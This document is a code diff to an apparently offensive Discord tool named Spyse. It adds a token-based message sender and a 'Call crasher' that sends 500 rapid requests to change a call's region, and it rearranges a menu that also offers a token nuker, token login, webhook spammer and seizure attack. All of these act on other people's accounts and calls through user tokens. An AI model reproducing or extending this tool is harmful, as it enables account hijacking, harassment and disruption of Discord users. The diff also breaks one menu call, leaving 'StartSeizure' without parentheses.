@@ -213,6 +213,36 @@ def StartSeizure():
             requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
             console.print("[green][[/green][purple]![/purple][green]][/green] [purple]processing[/purple]")
 
+def token_sender():
+    os.system(f'Title - Spyse - Token sender')
+    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
+    validateToken(token)
+    channel = console.input("[green][[/green][purple]?[/purple][green]][/green][purple] Channel[/purple] : ")
+    message = console.input(f"[green][[/green][purple]?[/purple][green]][/green] Enter the text you want to[purple] send[/purple] : ")
+    setting = {'content': message}
+    r = requests.post(f'https://discord.com/api/v9/channels/{channel}/messages', headers=getheaders(token), json = setting).json()
+    console.print("[green][[/green][purple]![/purple][green]][/green] message [red]sent[/red]")
+    console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
+    main()
+
+def spamer():
+    os.system(f'Title - Spyse - Call crasher')
+    token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
+    validateToken(token)
+    channel = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Channel[/purple] : ")
+    try:
+        for i in range(500):
+            setting = {'region': random.choice(['brazil','hongkong','india','japan','rotterdam','russia','russia','southafrica','us-east','us-south','us-west'])}
+            r = requests.patch(f'https://discord.com/api/v9/channels/{channel}/call', headers=getheaders(token), json = setting)
+            console.print(f"[green][[/green][purple]![/purple][green]][/green] region changed to [red]{setting}[/red]")
+        console.print("[red][[/red][purple]![/purple][red]][/red] Attack [red]finish[/red]")
+        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
+        main()
+    except:
+        console.print("[red][[/red][purple]![/purple][red]][/red] An error [red]occured[/red]")
+        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
+        main()
+
 def tokendisable():
     os.system(f'Title - Spyse - token nuker')
     token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
@@ -387,13 +417,14 @@ def main():
                                     [green]███████[/green]║[green]██[/green]║        [green]██[/green]║   [green]███████[/green]║[green]███████[/green]╗    
                                     ╚══════╝╚═╝        ╚═╝   ╚══════╝╚══════╝    
                             ╔═══════════════════════════════════════════════════╗                                             
-                            ║  [green]{[/green][purple]1[/purple][green]}[/green] [red]Dm deleter[/red]              [green]{[/green][purple]8[/purple][green]}[/green] Server leaver    ║
-                            ║  [green]{[/green][purple]2[/purple][green]}[/green] Webhook deleter         [green]{[/green][purple]9[/purple][green]}[/green] Seizure          ║
-                            ║  [green]{[/green][purple]3[/purple][green]}[/green] Webhook spamer          [green]{[/green][purple]10[/purple][green]}[/green] Token info      ║
-                            ║  [green]{[/green][purple]4[/purple][green]}[/green] Bio changer             [green]{[/green][purple]11[/purple][green]}[/green] Setting         ║
-                            ║  [green]{[/green][purple]5[/purple][green]}[/green] Token nuker             [green]{[/green][purple]12[/purple][green]}[/green] Make a report   ║                                                                                                                                                 
-                            ║  [green]{[/green][purple]6[/purple][green]}[/green] Login token             [green]{[/green][purple]13[/purple][green]}[/green] History         ║
-                            ║  [green]{[/green][purple]7[/purple][green]}[/green] Status changer          [green]{[/green][purple]14[/purple][green]}[/green] Exit            ║
+                            ║  [green]{[/green][purple]1[/purple][green]}[/green] [red]Dm deleter[/red]              [green]{[/green][purple]9[/purple][green]}[/green] Server leaver    ║
+                            ║  [green]{[/green][purple]2[/purple][green]}[/green] Webhook deleter         [green]{[/green][purple]10[/purple][green]}[/green] Seizure         ║
+                            ║  [green]{[/green][purple]3[/purple][green]}[/green] Webhook spamer          [green]{[/green][purple]11[/purple][green]}[/green] Token info      ║
+                            ║  [green]{[/green][purple]4[/purple][green]}[/green] Bio changer             [green]{[/green][purple]12[/purple][green]}[/green] Token sender    ║
+                            ║  [green]{[/green][purple]5[/purple][green]}[/green] Token nuker             [green]{[/green][purple]13[/purple][green]}[/green] Setting         ║                                                                                                                                                 
+                            ║  [green]{[/green][purple]6[/purple][green]}[/green] Login token             [green]{[/green][purple]14[/purple][green]}[/green] Make a report   ║
+                            ║  [green]{[/green][purple]7[/purple][green]}[/green] Status changer          [green]{[/green][purple]15[/purple][green]}[/green] History         ║
+                            ║  [green]{[/green][purple]8[/purple][green]}[/green] Call crasher            [green]{[/green][purple]16[/purple][green]}[/green] Exit            ║
                             ╚═══════════════════════════════════════════════════╝
                  
     """
@@ -416,18 +447,22 @@ def main():
     if choice == "7":
         statut_changer()
     if choice == "8":
-        Leaver()
+        spamer()
     if choice == "9":
-        StartSeizure()
+        Leaver()
     if choice == "10":
-        token_info()
+        StartSeizure
     if choice == "11":
-        setting()
+        token_info()
     if choice == "12":
-        report()
+        token_sender()
     if choice == "13":
-        history()
+        setting()
     if choice == "14":
+        report()
+    if choice == "15":
+        history()
+    if choice == "16":
         raise SystemExit
     else:
         os.system('cls||clear')
